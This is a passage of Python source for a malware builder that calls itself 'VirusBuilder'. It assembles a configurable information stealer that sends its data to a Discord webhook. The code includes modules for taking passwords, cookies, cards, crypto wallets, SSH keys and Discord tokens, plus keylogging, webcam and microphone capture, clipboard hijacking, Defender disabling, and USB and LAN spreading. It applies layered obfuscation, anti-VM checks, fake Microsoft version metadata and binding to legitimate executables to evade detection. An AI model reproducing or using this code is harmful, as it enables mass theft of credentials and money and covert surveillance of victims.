        "                except Exception: pass\n"
        "                v4r_c2time.sleep(15)\n"
        "        v4r_c2t.Thread(target=v4r_c2_loop, daemon=False).start()\n"
        "    D3f_C2Heartbeat()\n"
        "except Exception: pass\n"
    )

    St4rt = (
        "\ntry:\n"
        "    if _v4r_t_errors:\n"
        "        _v4r_post('Errors', '\\n'.join(_v4r_t_errors), color=0xff6600)\n"
        "except Exception: pass\n"
    )

    def XorEncryptStrings(fp):
        """Post-process the generated .py: XOR-encrypt all string literals."""
        try:
            with open(fp, 'r', encoding='utf-8') as f:
                src = f.read()
            tree = ast.parse(src)
            lines = src.splitlines(keepends=True)
            replacements = []
            xk = random.randint(1, 254)
            for node in ast.walk(tree):
                if isinstance(node, ast.Constant) and isinstance(node.value, str):
                    s = node.value
                    if len(s) < 4 or len(s) > 300: continue
                    enc = ''.join(chr(ord(c) ^ xk) for c in s)
                    expr = f'("".join(chr(ord(c)^{xk})for c in {repr(enc)}))'
                    replacements.append((node.lineno, node.col_offset, node.end_lineno, node.end_col_offset, expr))
            if not replacements:
                return
            new_lines = list(lines)
            for lineno, col, end_lineno, end_col, expr in sorted(replacements, reverse=True):
                if lineno != end_lineno: continue
                line = new_lines[lineno - 1]
                new_lines[lineno - 1] = line[:col] + expr + line[end_col:]
            with open(fp, 'w', encoding='utf-8') as f:
                f.writelines(new_lines)
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} String XOR encryption applied (key={xk}).")
        except Exception as e:
            try: _send_error_wh(f"String encryption failed: {e}")
            except: pass

    def WriteFakeVersionFile(dest_dir, prod_name, company, version):
        """Write a PyInstaller version-file for fake metadata."""
        parts = [int(x) for x in (version + ".0.0.0").split(".")[:4]]
        vf = os.path.join(dest_dir, "_versioninfo.txt")
        content = f"""VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({parts[0]},{parts[1]},{parts[2]},{parts[3]}),
    prodvers=({parts[0]},{parts[1]},{parts[2]},{parts[3]}),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0,
    date=(0,0)),
  kids=[
    StringFileInfo([StringTable('040904B0',[
      StringStruct('CompanyName',      '{company}'),
      StringStruct('FileDescription',  '{prod_name}'),
      StringStruct('FileVersion',      '{version}'),
      StringStruct('InternalName',     '{prod_name}'),
      StringStruct('OriginalFilename', '{prod_name}.exe'),
      StringStruct('ProductName',      '{prod_name}'),
      StringStruct('ProductVersion',   '{version}'),
    ])]),
    VarFileInfo([VarStruct('Translation', [0x0409, 0x04B0])])
  ]
)
"""
        with open(vf, 'w') as f: f.write(content)
        return vf

    def Encryption(wh):
        def _enc(plain, key):
            def _dk(pwd, salt):
                kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt,
                                 iterations=100000, backend=default_backend())
                return kdf.derive(pwd.encode() if isinstance(pwd, str) else pwd)
            salt = os.urandom(16)
            iv   = os.urandom(16)
            dk   = _dk(key, salt)
            pad  = padding.PKCS7(128).padder()
            pdat = pad.update(plain.encode()) + pad.finalize()
            ciph = Cipher(algorithms.AES(dk), modes.CBC(iv), backend=default_backend()).encryptor()
            enc  = ciph.update(pdat) + ciph.finalize()
            return base64.b64encode(salt + iv + enc).decode()

        key = ''.join(random.choices(string.ascii_letters, k=random.randint(100, 200)))
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Encryption key created: {white}{key[:75]}..")
        enc_wh = _enc(wh, key)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Encrypted webhook: {white}{enc_wh[:75]}..")
        return key, enc_wh

    def PythonFile(fp, fp_rel, key_enc, wh_enc):
        if file_type not in ("Exe File", "Python File"):
            return
        try:
            browser_choice = []
            if option_extentions  == "Enable": browser_choice.append('"extentions"')
            if option_passwords   == "Enable": browser_choice.append('"passwords"')
            if option_cookies     == "Enable": browser_choice.append('"cookies"')
            if option_history     == "Enable": browser_choice.append('"history"')
            if option_downloads   == "Enable": browser_choice.append('"downloads"')
            if option_cards       == "Enable": browser_choice.append('"cards"')

            session_files_choice = []
            if option_wallets      == "Enable": session_files_choice.append('"Wallets"')
            if option_game_launchers == "Enable": session_files_choice.append('"Game Launchers"')
            if option_apps         == "Enable": session_files_choice.append('"Apps"')

            with open(fp, 'w', encoding='utf-8') as f:
                if binder_path and os.path.isfile(binder_path):
                    _bn  = os.path.basename(binder_path)
                    _ext = os.path.splitext(_bn)[1]
                    if file_type == "Exe File":
                        f.write(T_BinderExe.replace("__BINDER_NAME__", _bn))
                    else:
                        import base64 as _b64
                        with open(binder_path, 'rb') as _bf:
                            _b64data = _b64.b64encode(_bf.read()).decode()
                        f.write(T_BinderPy
                                .replace("__BINDER_B64__", _b64data)
                                .replace("__BINDER_EXT__", _ext)
                                .replace("__BINDER_NAME__", _bn))

                if option_anti_vm_and_debug == "Enable":
                    f.write(Ant1VM4ndD3bug)

                f.write(Obligatory
                    .replace("%WEBHOOK_URL%", wh_enc)
                    .replace("%KEY%", key_enc)
                    .replace("%LINK_AVATAR%", avatar_webhook)
                    .replace("%LINK_GITHUB%", github_tool)
                    .replace("%LINK_WEBSITE%", website))

                if option_system             == "Enable": f.write(Sy5t3mInf0)
                if option_discord            == "Enable": f.write(Di5c0rdAccount)
                if option_discord_injection  == "Enable": f.write(Di5c0rdIj3ct10n)
                if option_interesting_files  == "Enable": f.write(Int3r3stingFil3s)
                if session_files_choice:
                    f.write(S3ssi0nFil3s.replace('"%SESSION_FILES_CHOICE%"', ', '.join(session_files_choice)))
                if browser_choice:
                    f.write(Br0w53r5t341.replace('"%BROWSER_CHOICE%"', ', '.join(browser_choice)))
                if option_roblox             == "Enable": f.write(R0b10xAccount)
                if option_webcam             == "Enable": f.write(W3bc4m)
                if option_screenshot         == "Enable": f.write(Scr33n5h0t)

                f.write(T_SingleInstance)
                f.write(T_FirstRunGuard)

                if option_wifi_passwords == "Enable":
                    f.write(T_WiFi.replace("__WEBHOOK__", webhook))
                if option_clipboard == "Enable":
                    f.write(T_Clipboard.replace("__WEBHOOK__", webhook))
                if option_ssh_keys == "Enable":
                    f.write(T_SSH.replace("__WEBHOOK__", webhook))
                if option_filezilla == "Enable":
                    f.write(T_FileZilla.replace("__WEBHOOK__", webhook))
                if option_env_variables == "Enable":
                    f.write(T_EnvVars.replace("__WEBHOOK__", webhook))
                if option_minecraft == "Enable":
                    f.write(T_Minecraft.replace("__WEBHOOK__", webhook))
                if option_keylogger == "Enable":
                    f.write(T_Keylogger.replace("__WEBHOOK__", webhook))
                if option_crypto_wallets == "Enable":
                    f.write(T_CryptoWallets.replace("__WEBHOOK__", webhook))
                if option_microphone == "Enable":
                    f.write(T_Microphone.replace("__WEBHOOK__", webhook))
                if option_firefox == "Enable":
                    f.write(T_Firefox.replace("__WEBHOOK__", webhook))
                if option_steam == "Enable":
                    f.write(T_Steam.replace("__WEBHOOK__", webhook))
                if option_timing_evasion == "Enable":
                    f.write(T_TimingEvasion)

                if option_block_key          == "Enable": f.write(B10ckK3y)
                if option_block_mouse        == "Enable": f.write(B10ckM0u53)
                if option_block_task_manager == "Enable": f.write(B10ckT45kM4n4g3r)
                if option_block_website      == "Enable": f.write(B10ckW3b5it3)
                if option_fake_error         == "Enable": f.write(F4k33rr0r(fake_error_title, fake_error_message))
                if option_spam_open_programs == "Enable": f.write(Sp4m0p3nPr0gr4m)
                if option_spam_create_files  == "Enable": f.write(Sp4mCr34tFil3)
                if option_shutdown           == "Enable": f.write(Shutd0wn)
                if option_startup            == "Enable": f.write(St4rtup)

                if any(x == "Enable" for x in [option_spam_open_programs, option_block_mouse, option_spam_create_files]):
                    f.write(Sp4mOpti0ns)

                if option_restart            == "Enable": f.write(R3st4rt)

                if option_clipboard_hijacker == "Enable":
                    f.write(T_ClipboardHijacker)
                if option_disable_defender   == "Enable":
                    f.write(T_DisableDefender)
                if option_usb_spreader       == "Enable":
                    f.write(T_UsbSpreader)
                if option_scheduled_task     == "Enable":
                    f.write(T_ScheduledTask)

                # ProcessDisguise fait os._exit() → tout ce qui suit ne s'exécute
                # jamais dans le 1er process. St4rt tourne ici (original.exe),
                # puis _v4r_skip_steal = True dans la copie déguisée (nom système).
                import textwrap as _txw
                f.write("if not _v4r_skip_steal:\n")
                f.write(_txw.indent(St4rt, "    "))

                if option_startup == "Enable":
                    f.write("\ntry: threading.Thread(target=D3f_St4rtup, daemon=True).start()\nexcept: pass\n")
                if option_restart == "Enable":
                    f.write("\ntry: threading.Thread(target=D3f_R3st4rt).start()\nexcept: pass\n")

                if option_process_disguise   == "Enable":
                    f.write(T_ProcessDisguise)
                if option_melt               == "Enable":
                    f.write(T_Melt)
                if option_c2_heartbeat       == "Enable":
                    f.write(T_C2Heartbeat
                            .replace("__PRIMARY_WEBHOOK__", webhook)
                            .replace("__REGISTRY_MSGID__", c2_registry_msgid))
                if option_polymorphic_repack == "Enable":
                    f.write(T_PolymorphicRepack)
                if option_lan_spreader       == "Enable":
                    f.write(T_LanSpreader.replace("__WEBHOOK__", webhook))

            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white}{fp_rel}")
        except Exception as e:
            print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white}{e}")
            Continue(); sys.exit(1)

    def PythonIdentifierObfuscation(fp):
        try:
            variable_map = {}
            def RN(): return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50, 100)))

            with open(fp, 'r', encoding='utf-8') as f:
                src = f.read()

            def visit(node):
                if isinstance(node, ast.Assign):
                    for tgt in node.targets:
                        if isinstance(tgt, ast.Name) and "v4r_" in tgt.id and tgt.id not in variable_map:
                            new = RN(); variable_map[tgt.id] = new; tgt.id = new
                elif isinstance(node, ast.FunctionDef):
                    if "D3f_" in node.name and node.name not in variable_map:
                        new = RN(); variable_map[node.name] = new; node.name = new
                    for arg in node.args.args:
                        if "v4r_" in arg.arg and arg.arg not in variable_map:
                            new = RN(); variable_map[arg.arg] = new; arg.arg = new
                elif isinstance(node, ast.ClassDef):
                    if "v4r_" in node.name and node.name not in variable_map:
                        new = RN(); variable_map[node.name] = new; node.name = new
                for child in ast.iter_child_nodes(node): visit(child)

            tree = ast.parse(src); visit(tree)
            with open(fp, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            with open(fp, 'w', encoding='utf-8') as f:
                for line in lines:
                    for old, new in variable_map.items():
                        if old in line: line = line.replace(old, new)
                    f.write(line)
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All identifiers obfuscated.")
        except: pass

    def FullObfuscation(fp):
        try:
            import gzip as _gz, marshal as _ms

            def rn():
                cs = string.ascii_letters + string.digits
                return random.choice(string.ascii_letters) + ''.join(random.choices(cs, k=random.randint(10, 20)))

            def xor_bytes(data, key):
                return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

            def chr_expr(s):
                return '""+"".join([' + ','.join(f'chr({ord(c)})' for c in s) + '])'

            def chunked(s, lo, hi):
                out, i = [], 0
                while i < len(s):
                    sz = random.randint(lo, hi)
                    out.append(f'"{s[i:i+sz]}"'); i += sz
                return out

            with open(fp, 'r', encoding='utf-8') as f:
                source = f.read()

            bytecode  = _ms.dumps(compile(source, '<string>', 'exec'))
            seed      = random.randint(1, 254)
            scrambled = bytes((b ^ ((seed + i) & 0xFF)) for i, b in enumerate(bytecode))
            compressed = _gz.compress(scrambled, compresslevel=9)
            k1  = bytes(random.randint(1, 255) for _ in range(random.randint(16, 48)))
            k2  = bytes(random.randint(1, 255) for _ in range(random.randint(16, 48)))
            ax1 = xor_bytes(compressed, k1)
            ax2 = xor_bytes(ax1, k2)
            enc = base64.b64encode(ax2).decode()
            k1e = base64.b64encode(k1).decode()
            k2e = base64.b64encode(k2).decode()

            pc  = chunked(enc, 40, 110)
            k1c = chunked(k1e, 16, 36)
            k2c = chunked(k2e, 16, 36)

            names = [rn() for _ in range(15)]
            vblob, vk1, vk2, vtmp, vgzr, vcode, vb64m, vgzm, vmsm, vblt, vefn, vseed, vi, vb, vba = names

            def junk():
                lines = []
                for _ in range(random.randint(5, 10)):
                    k = random.randint(0, 7)
                    if k == 0: lines.append(f'{rn()}={random.randint(10000,9999999)}')
                    elif k == 1: lines.append(f'{rn()}="{rn()}"')
                    elif k == 2: a,b=rn(),rn(); lines.append(f'{a}=lambda {b}:{b}')
                    elif k == 3: lines.append(f'{rn()}=[{",".join(str(random.randint(0,255)) for _ in range(5))}]')
                    elif k == 4: lines.append(f'{rn()}=None')
                    elif k == 5: a=rn(); lines.append(f'try:\n {a}=1/{random.randint(1,9)}\nexcept:pass')
                    elif k == 6: a,b=rn(),rn(); n=random.randint(1,5); lines.append(f'{a}=0\nfor {b} in range({n}):{a}+={b}')
                    else: lines.append(f'if {random.choice(["True","False","1==1"])}:{rn()}={random.randint(0,9999)}\nelse:{rn()}={random.randint(0,9999)}')
                return '\n'.join(lines)

            jb = [junk() for _ in range(4)]; random.shuffle(jb)
            eb64=chr_expr('base64'); egz=chr_expr('gzip'); ems=chr_expr('marshal')
            eblt=chr_expr('builtins'); eexc=chr_expr('exec')

            stub = (
                f'{jb[0]}\n{vb64m}=__import__({eb64})\n{vgzm}=__import__({egz})\n{vmsm}=__import__({ems})\n'
                f'{jb[1]}\n{vblob}=({"+".join(pc)})\n{vk1}=({"+".join(k1c)})\n{vk2}=({"+".join(k2c)})\n'
                f'{vtmp}={vb64m}.b64decode({vblob})\n{vk1}={vb64m}.b64decode({vk1})\n{vk2}={vb64m}.b64decode({vk2})\n'
                f'{jb[2]}\n'
                # Python 3.12+ broke genexpressions inside exec() — use bytearray loops instead
                f'{vba}=bytearray({vtmp})\n'
                f'for {vi} in range(len({vba})):{vba}[{vi}]^={vk2}[{vi}%len({vk2})]\n'
                f'{vtmp}=bytes({vba})\n'
                f'{vba}=bytearray({vtmp})\n'
                f'for {vi} in range(len({vba})):{vba}[{vi}]^={vk1}[{vi}%len({vk1})]\n'
                f'{vtmp}=bytes({vba})\n'
                f'{vgzr}={vgzm}.decompress({vtmp})\n'
                f'{vseed}={seed}\n'
                f'{vba}=bytearray({vgzr})\n'
                f'for {vi} in range(len({vba})):{vba}[{vi}]^=({vseed}+{vi})&255\n'
                f'{vgzr}=bytes({vba})\n'
                f'{vcode}={vmsm}.loads({vgzr})\n'
                f'{jb[3]}\n{vblt}=__import__({eblt})\n{vefn}=getattr({vblt},{eexc})\n{vefn}({vcode})\n'
            )
            with open(fp, 'w', encoding='utf-8') as f:
                f.write(stub)
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Full obfuscation applied (6-layer: marshal+scramble+gzip+XOR*2+b64).")
        except Exception as e:
            try: _send_error_wh(f"Full obfuscation failed: {e}")
            except: pass

    _DEPS = [
        "pyinstaller", "pywin32",
        "requests", "urllib3", "certifi", "charset-normalizer", "idna",
        "cryptography", "pycryptodome",
        "psutil", "discord.py", "cffi",
        "gputil", "browser-cookie3",
        "icoextract",
    ]
    if option_keylogger == "Enable":
        _DEPS.append("pynput")
    if option_webcam == "Enable" or option_screenshot == "Enable":
        _DEPS.append("Pillow")
    if option_webcam == "Enable":
        _DEPS.append("opencv-python")
    if option_microphone == "Enable":
        _DEPS += ["sounddevice", "soundfile"]

    def ConvertToExe(fp, dest, nf, ico=None, upx_path=None, version_file=None):
        os.makedirs(dest, exist_ok=True)
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstalling pathlib..")
        subprocess.run([sys.executable, "-m", "pip", "uninstall", "pathlib", "-y"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Installing dependencies (parallel)..")
        import concurrent.futures as _cf
        def _pip(dep):
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                            "--disable-pip-version-check", dep],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with _cf.ThreadPoolExecutor(max_workers=8) as _pool:
            list(_pool.map(_pip, _DEPS))
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")
        try:
            script = os.path.abspath(fp)
            cwd    = os.path.dirname(script)

            _HIDDEN = [
                # pywin32
                "win32api", "win32con", "win32gui", "win32process",
                "win32clipboard", "win32security", "win32event",
                "win32cred", "win32crypt", "win32print",
                "winerror", "pywintypes",
                # pynput
                "pynput", "pynput.keyboard", "pynput.mouse",
                "pynput.keyboard._win32", "pynput.mouse._win32",
                "pynput._util", "pynput._util.win32",
                # requests + urllib3
                "requests", "requests.adapters", "requests.auth",
                "requests.cookies", "requests.exceptions",
                "urllib3", "urllib3.contrib", "urllib3.util",
                "certifi", "charset_normalizer", "idna",
                # cryptography — all submodules PyInstaller misses
                "cryptography",
                "cryptography.hazmat",
                "cryptography.hazmat.primitives",
                "cryptography.hazmat.primitives.kdf",
                "cryptography.hazmat.primitives.kdf.pbkdf2",
                "cryptography.hazmat.primitives.kdf.hkdf",
                "cryptography.hazmat.primitives.kdf.scrypt",
                "cryptography.hazmat.primitives.ciphers",
                "cryptography.hazmat.primitives.ciphers.algorithms",
                "cryptography.hazmat.primitives.ciphers.modes",
                "cryptography.hazmat.primitives.hashes",
                "cryptography.hazmat.primitives.hmac",
                "cryptography.hazmat.primitives.padding",
                "cryptography.hazmat.primitives.asymmetric",
                "cryptography.hazmat.primitives.asymmetric.rsa",
                "cryptography.hazmat.primitives.asymmetric.padding",
                "cryptography.hazmat.primitives.serialization",
                "cryptography.hazmat.backends",
                "cryptography.hazmat.backends.openssl",
                "cryptography.hazmat.backends.openssl.backend",
                "cryptography.hazmat.bindings",
                "cryptography.hazmat.bindings._rust",
                "cryptography.fernet",
                "cryptography.x509",
                # imaging / cv2
                "cv2", "PIL", "PIL.Image", "PIL.ImageGrab",
                # audio
                "sounddevice", "soundfile",
                # discord
                "discord", "discord.ext", "discord.ext.commands",
                "discord.http", "discord.gateway", "discord.state",
                # misc
                "psutil", "sqlite3", "json", "base64",
                "xml.etree", "xml.etree.ElementTree",
                # extra deps
                "GPUtil",
                "Cryptodome", "Cryptodome.Cipher", "Cryptodome.Cipher.AES",
                "browser_cookie3",
            ]

            cmd = [sys.executable, "-m", "PyInstaller",
                   "--onefile", "--noconsole",
                   "--name", nf,
                   "--distpath", dest,
                   "--clean",
                   "--collect-all", "cryptography",
                   "--collect-all", "discord",
                   "--collect-all", "requests",
                   "--collect-all", "psutil",
                   "--collect-all", "Cryptodome",
                   "--collect-all", "browser_cookie3",
                   "--collect-all", "GPUtil",
                   ]
            if option_keylogger == "Enable":
                cmd += ["--collect-all", "pynput"]
            if option_webcam == "Enable" or option_screenshot == "Enable":
                cmd += ["--collect-all", "PIL"]
            if option_webcam == "Enable":
                cmd += ["--hidden-import", "cv2", "--hidden-import", "cv2.cv2"]
            if option_microphone == "Enable":
                cmd += ["--collect-all", "sounddevice", "--collect-all", "soundfile"]
            for hi in _HIDDEN:
                cmd += ["--hidden-import", hi]
            _auto_ico = None
            if binder_path and os.path.isfile(binder_path) and binder_path.lower().endswith('.exe'):
                if not (ico and os.path.exists(ico)):
                    try:
                        import icoextract
                        _auto_ico = os.path.join(dest, "_binder_autoicon.ico")
                        extractor = icoextract.IconExtractor(binder_path)
                        extractor.export_icon(_auto_ico)
                        ico = _auto_ico
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Icon auto-extracted from binder exe.")
                    except Exception as _ie:
                        _auto_ico = None
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Icon auto-extract skipped: {white}{_ie}")

            if ico and os.path.exists(ico):
                cmd += ["--icon", ico]
            if version_file and os.path.exists(version_file):
                cmd += ["--version-file", version_file]
            if upx_path:
                upx_dir = os.path.dirname(upx_path) if os.path.isfile(upx_path) else upx_path
                if upx_dir: cmd += ["--upx-dir", upx_dir]
            if binder_path and os.path.isfile(binder_path):
                _sep = ";" if os.name == "nt" else ":"
                cmd += ["--add-data", f"{binder_path}{_sep}."]
                _bn = os.path.basename(binder_path)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Repacking: {white}payload + {_bn} → {nf}.exe")
            cmd.append(script)

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, cwd=cwd, bufsize=1)
            _step_keywords = {
                "Analyzing": "Analyzing scripts..",
                "Processing": "Processing modules..",
                "Collecting": "Collecting dependencies..",
                "Building": "Building EXE..",
                "Appending": "Appending PKG archive..",
                "completed successfully": None,
            }
            _shown = set()
            _all_lines = []
            for line in proc.stdout:
                line = line.rstrip()
                _all_lines.append(line)
                for kw, msg in _step_keywords.items():
                    if kw in line and kw not in _shown:
                        _shown.add(kw)
                        if msg:
                            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} {msg}")
            proc.wait()

            _conv_ok = proc.returncode == 0
            if _conv_ok:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
                if upx_path:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} UPX compression applied.")
                if version_file:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake metadata injected.")
            else:
                _err_tail = "\n".join(_all_lines[-35:])
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} PyInstaller output:\n{_err_tail}")
                try: _send_error_wh(f"PyInstaller failed (code {proc.returncode})\n\n{_err_tail}")
                except: pass

            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Cleaning up temp files..")
                bd = os.path.join(cwd, "build")
                sf = os.path.join(cwd, f"{nf}.spec")
                if os.path.isdir(bd): shutil.rmtree(bd)
                if os.path.isfile(sf): os.remove(sf)
                if os.path.isfile(fp): os.remove(fp)
                if version_file and os.path.isfile(version_file): os.remove(version_file)
                if _auto_ico and os.path.isfile(_auto_ico): os.remove(_auto_ico)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temp files removed.")
            except Exception as e:
                try: _send_error_wh(f"Cleanup error: {e}")
                except: pass

            return _conv_ok
        except Exception as e:
            try: _send_error_wh(f"Conversion error: {e}")
            except: pass
            return False

    def SendWebhook(wh):
        def _post(embed):
            try:
                requests.post(wh, data=json.dumps({'embeds': [embed], 'username': username_webhook, 'avatar_url': avatar_webhook}),
                              headers={'Content-Type': 'application/json'}, timeout=5)
            except: pass

        _binder_disp = os.path.basename(binder_path) if (binder_path and os.path.isfile(binder_path)) else "None"
        _post({'title': 'Virus Created — Config', 'color': color_webhook, 'fields': [
            {"name": "Name",      "value": f"```{name_file}```",    "inline": True},
            {"name": "Type",      "value": f"```{file_type}```",    "inline": True},
            {"name": "Binder",    "value": f"```{_binder_disp}```", "inline": True},
            {"name": "Webhook",   "value": wh,                      "inline": False},
        ], 'footer': {"text": username_webhook, "icon_url": avatar_webhook}})

        _post({'title': 'Virus Created — Stealer', 'color': color_webhook, 'fields': [
            {"name": k, "value": f"```{v}```", "inline": True} for k, v in [
                ("System Info", option_system), ("Wallets", option_wallets), ("Games", option_game_launchers),
                ("Telegram", option_apps), ("Roblox", option_roblox), ("Discord", option_discord),
                ("Discord Injection", option_discord_injection), ("Passwords", option_passwords),
                ("Cookies", option_cookies), ("History", option_history), ("Downloads", option_downloads),
                ("Cards", option_cards), ("Extensions", option_extentions),
                ("Interesting Files", option_interesting_files), ("Webcam", option_webcam),
                ("Screenshot", option_screenshot), ("WiFi Passwords", option_wifi_passwords),
                ("Clipboard", option_clipboard), ("SSH Keys", option_ssh_keys),
                ("FileZilla", option_filezilla), ("Env Variables", option_env_variables),
                ("Minecraft", option_minecraft), ("Keylogger", option_keylogger),
                ("Firefox", option_firefox), ("Steam", option_steam),
            ]
        ], 'footer': {"text": username_webhook, "icon_url": avatar_webhook}})

        _post({'title': 'Virus Created — Malware', 'color': color_webhook, 'fields': [
            {"name": k, "value": f"```{v}```", "inline": True} for k, v in [
                ("Block Key", option_block_key), ("Block Mouse", option_block_mouse),
                ("Block Task Manager", option_block_task_manager), ("Block AV Website", option_block_website),
                ("Shutdown", option_shutdown), ("Spam Open Programs", option_spam_open_programs),
                ("Spam Create Files", option_spam_create_files), ("Fake Error", option_fake_error),
                ("Startup", option_startup), ("Restart 5min", option_restart),
                ("Anti VM & Debug", option_anti_vm_and_debug),
                ("Clipboard Hijacker", option_clipboard_hijacker), ("Melt", option_melt),
                ("Disable Defender", option_disable_defender), ("USB Spreader", option_usb_spreader),
                ("Scheduled Task", option_scheduled_task), ("Process Disguise", option_process_disguise),
                ("Polymorphic Repack", option_polymorphic_repack), ("LAN Spreader", option_lan_spreader),
            ]
        ], 'footer': {"text": username_webhook, "icon_url": avatar_webhook}})

    def _send_error_wh(msg):
        try:
            _wh = webhook if (webhook and webhook not in ("None", "")) else None
            if not _wh: return
            requests.post(_wh, json={
                'embeds': [{'title': f'[Builder Error] {name_file}',
                            'description': f'```{str(msg)[:3900]}```',
                            'color': 0xff0000}],
                'username': username_webhook
            }, timeout=5)
        except: pass

    _out_root = _preset_1py_root if _PRESET_MODE else tool_path
    fp_rel   = f"build\\VirusBuilder\\{name_file}.py"
    fp       = os.path.join(_out_root, "build", "VirusBuilder", f"{name_file}.py")
    dest     = os.path.join(_out_root, "build", "VirusBuilder")
    dest_rel = "build\\VirusBuilder"
    os.makedirs(dest, exist_ok=True)

    try: key_enc, wh_enc = Encryption(webhook)
    except Exception as _e: _send_error_wh(f"Encryption failed: {_e}"); key_enc = wh_enc = ""

    try: PythonFile(fp, fp_rel, key_enc, wh_enc)
    except Exception as _e: _send_error_wh(f"PythonFile failed: {_e}")

    try: PythonIdentifierObfuscation(fp)
    except Exception as _e: _send_error_wh(f"Identifier obfuscation failed: {_e}")

    # FullObfuscation must run first: it calls compile() on the source, which fails if
    # XorEncryptStrings has already rewritten string literals with chr() expressions.
    try: FullObfuscation(fp)
    except Exception as _e: _send_error_wh(f"FullObfuscation failed: {_e}")

    if option_string_encryption == "Enable":
        try: XorEncryptStrings(fp)
        except Exception as _e: _send_error_wh(f"XorEncryptStrings failed: {_e}")

    if file_type == "Exe File":
        ico = icon_path if (icon_path and icon_path != "None" and os.path.exists(icon_path)) else None
        _upx = _build_upx_path if _build_upx_path else None
        _vf  = None
        _fn  = _build_fake_name
        _fc  = _build_fake_company
        _fv  = _build_fake_ver or "1.0.0.0"
        if option_fake_metadata == "Enable" and (_fn or _fc):
            try:
                _vf = WriteFakeVersionFile(os.path.dirname(fp) if os.path.exists(fp) else dest, _fn or name_file, _fc or "Microsoft", _fv)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake version file created.")
            except Exception as e:
                _send_error_wh(f"Version file failed: {e}")
        try:
            ConvertToExe(fp, dest, name_file, ico,
                         upx_path=_upx if option_upx_compress == "Enable" else None,
                         version_file=_vf)
        except Exception as _e:
            _send_error_wh(f"ConvertToExe failed: {_e}")

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Build complete — output: {white}{dest_rel}")
    try: os.startfile(dest)
    except: pass
    try: SendWebhook(webhook)
    except: pass
    Continue(); Reset()

except Exception as e:
    try:
        _wh = webhook if (webhook and webhook not in ("None", "")) else None
        if _wh:
            requests.post(_wh, json={
                'embeds': [{'title': '[Builder Fatal Error]',
                            'description': f'```{str(e)[:3900]}```',
                            'color': 0xff0000}],
                'username': 'Ultria Builder'
            }, timeout=5)
    except: pass
